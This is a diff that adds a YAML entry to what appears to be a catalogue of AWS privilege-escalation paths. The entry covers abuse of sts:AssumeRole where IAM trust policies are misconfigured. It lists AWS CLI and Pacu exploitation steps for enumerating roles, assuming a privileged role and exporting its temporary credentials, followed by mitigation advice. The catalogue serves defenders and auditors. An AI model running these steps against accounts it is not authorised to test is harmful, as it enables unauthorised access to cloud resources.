@@ -1,0 +1,109 @@
+id: sts-001
+name: sts:AssumeRole
+category: lateral-movement
+services:
+- sts
+description: A principal with `sts:AssumeRole` permission can assume IAM roles that trust them in their trust policy. If a
+  role with elevated permissions has a trust policy that allows the attacker's principal to assume it, they can gain those
+  elevated permissions by assuming the role. This is one of the most straightforward privilege escalation paths when misconfigured
+  trust relationships exist.
+prerequisites:
+  admin:
+  - A role must exist with administrative permissions (e.g., AdministratorAccess)
+  - The role's trust policy must allow the attacker's principal (user/role) to assume it
+  lateral:
+  - A role must exist with elevated permissions
+  - The role's trust policy must allow the attacker's principal (user/role) to assume it
+exploitationSteps:
+  awscli:
+  - step: 1
+    command: aws iam list-roles
+    description: List available roles to find targets with elevated permissions
+  - step: 2
+    command: aws iam get-role --role-name TARGET_ROLE
+    description: Check the role's trust policy to confirm the attacker can assume it
+  - step: 3
+    command: |
+      aws sts assume-role \
+        --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE \
+        --role-session-name privesc-session
+    description: Assume the privileged role to obtain temporary credentials
+  - step: 4
+    command: |
+      export AWS_ACCESS_KEY_ID=<AccessKeyId from step 3>
+      export AWS_SECRET_ACCESS_KEY=<SecretAccessKey from step 3>
+      export AWS_SESSION_TOKEN=<SessionToken from step 3>
+    description: Configure the AWS CLI to use the assumed role credentials
+  - step: 5
+    command: aws sts get-caller-identity
+    description: Verify the assumed role identity and elevated permissions
+  pacu:
+  - step: 1
+    command: run iam__enum_permissions
+    description: Enumerate IAM permissions and identify assumable roles
+  - step: 2
+    command: run iam__assume_role --role-arn arn:aws:iam::ACCOUNT_ID:role/TARGET_ROLE
+    description: Assume the privileged role using Pacu
+recommendation: |
+  Carefully audit IAM role trust policies to ensure they follow the principle of least privilege.
+  Only allow trusted principals to assume sensitive roles.
+
+  Example restrictive trust policy:
+  ```json
+  {
+    "Version": "2012-10-17",
+    "Statement": [
+      {
+        "Effect": "Allow",
+        "Principal": {
+          "AWS": "arn:aws:iam::ACCOUNT_ID:role/SpecificTrustedRole"
+        },
+        "Action": "sts:AssumeRole",
+        "Condition": {
+          "StringEquals": {
+            "sts:ExternalId": "unique-external-id"
+          },
+          "IpAddress": {
+            "aws:SourceIp": "203.0.113.0/24"
+          }
+        }
+      }
+    ]
+  }
+  ```
+
+  Additional controls:
+  - Use external IDs for cross-account role assumptions
+  - Implement IP address restrictions in trust policies
+  - Require MFA for sensitive role assumptions
+  - Monitor CloudTrail for `AssumeRole` events on privileged roles
+  - Regularly audit role trust policies with AWS IAM Access Analyzer
+  - Alert on unusual assume-role patterns
+  - Use SCPs to restrict which roles can be assumed
+discoveredBy:
+  name: Spencer Gietzen
+  organization: Rhino Security Labs
+  date: '2019'
+references:
+- title: AWS Privilege Escalation Methods and Mitigation
+  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
+- title: IAM Vulnerable - AssumeRole
+  url: https://github.com/BishopFox/iam-vulnerable
+relatedPaths:
+- iam-002
+- iam-003
+- iam-004
+toolSupport:
+  pmapper: true
+  iamVulnerable: true
+  pacu: true
+permissions:
+  required:
+  - permission: sts:AssumeRole
+    resourceConstraints: Target role ARN must be in the Resource section and the role's trust policy must allow the principal
+      to assume it
+  additional:
+  - permission: iam:ListUsers
+    resourceConstraints: Helpful for discovering target users
+  - permission: iam:GetUser
+    resourceConstraints: Useful for viewing user details
